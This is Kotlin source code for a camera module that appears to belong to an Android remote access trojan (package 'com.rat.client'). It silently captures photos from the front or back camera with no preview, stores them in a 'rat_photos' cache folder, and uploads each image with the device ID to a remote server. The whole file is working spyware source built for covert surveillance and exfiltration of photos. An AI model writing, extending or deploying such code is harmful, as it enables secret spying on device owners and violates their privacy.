package com.rat.client.utils

import android.Manifest
import android.content.Context
import android.content.Intent
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.view.Surface
import com.rat.client.Config
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Captures photos from front and back cameras without preview.
 * Uses Camera2 API for silent capture.
 */
object CameraUtils {
    private const val TAG = "CameraUtils"
    private const val PHOTO_WIDTH = 1280
    private const val PHOTO_HEIGHT = 720

    /**
     * Capture a photo from the specified camera.
     * @param context Application context
     * @param useFront true for front camera, false for back camera
     */
    fun capturePhoto(context: Context, useFront: Boolean): File? {
        if (!PermissionManager.hasPermissions(context, arrayOf(Manifest.permission.CAMERA))) {
            Log.w(TAG, "Camera permission not granted")
            return null
        }

        return try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = getCameraId(cameraManager, useFront) ?: run {
                Log.e(TAG, "No ${if (useFront) "front" else "back"} camera found")
                return null
            }

            val latch = CountDownLatch(1)
            var capturedFile: File? = null

            val handlerThread = HandlerThread("CameraCapture")
            handlerThread.start()
            val handler = Handler(handlerThread.looper)

            // Create output file
            val outputDir = File(context.cacheDir, "rat_photos")
            outputDir.mkdirs()
            val outputFile = File(outputDir, "photo_${System.currentTimeMillis()}_${if (useFront) "front" else "back"}.jpg")

            val reader = ImageReader.newInstance(PHOTO_WIDTH, PHOTO_HEIGHT, android.graphics.ImageFormat.JPEG, 2)

            reader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                if (image != null) {
                    try {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        FileOutputStream(outputFile).use { it.write(bytes) }
                        capturedFile = outputFile
                        Log.d(TAG, "Photo saved: ${outputFile.absolutePath}")
                    } catch (e: Exception) {
                        Log.e(TAG, "Error saving photo: ${e.message}")
                    } finally {
                        image.close()
                    }
                }
                latch.countDown()
            }, handler)

            // Open camera and create capture session
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        val surfaces = listOf(reader.surface)
                        camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                    request.addTarget(reader.surface)
                                    session.capture(request.build(), null, handler)
                                } catch (e: Exception) {
                                    Log.e(TAG, "Capture error: ${e.message}")
                                    latch.countDown()
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                Log.e(TAG, "Configure failed")
                                latch.countDown()
                            }
                        }, handler)
                    } catch (e: Exception) {
                        Log.e(TAG, "Session error: ${e.message}")
                        latch.countDown()
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    Log.w(TAG, "Camera disconnected")
                    latch.countDown()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera error: $error")
                    latch.countDown()
                }
            }, handler)

            latch.await(15, TimeUnit.SECONDS)
            handlerThread.quitSafely()

            // Upload to server
            if (capturedFile != null && capturedFile!!.exists()) {
                uploadPhoto(context, capturedFile!!, useFront)
            }

            capturedFile
        } catch (e: Exception) {
            Log.e(TAG, "Capture photo error: ${e.message}")
            null
        }
    }

    private fun getCameraId(cameraManager: CameraManager, useFront: Boolean): String? {
        for (id in cameraManager.cameraIdList) {
            val characteristics = cameraManager.getCameraCharacteristics(id)
            val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
            if (useFront && facing == CameraCharacteristics.LENS_FACING_FRONT) return id
            if (!useFront && facing == CameraCharacteristics.LENS_FACING_BACK) return id
        }
        return null
    }

    private fun uploadPhoto(context: Context, file: File, isFront: Boolean) {
        try {
            val extraFields = mapOf(
                "deviceId" to DeviceInfoUtils.getDeviceId(context),
                "fileName" to file.name,
                "mimeType" to "image/jpeg",
                "isVideo" to "false",
            )
            ApiClient.uploadFile(Config.Api.UPLOAD_MEDIA, file, extraFields)
            Log.d(TAG, "Photo uploaded: ${file.name}")
        } catch (e: Exception) {
            Log.e(TAG, "Upload error: ${e.message}")
        }
    }
}

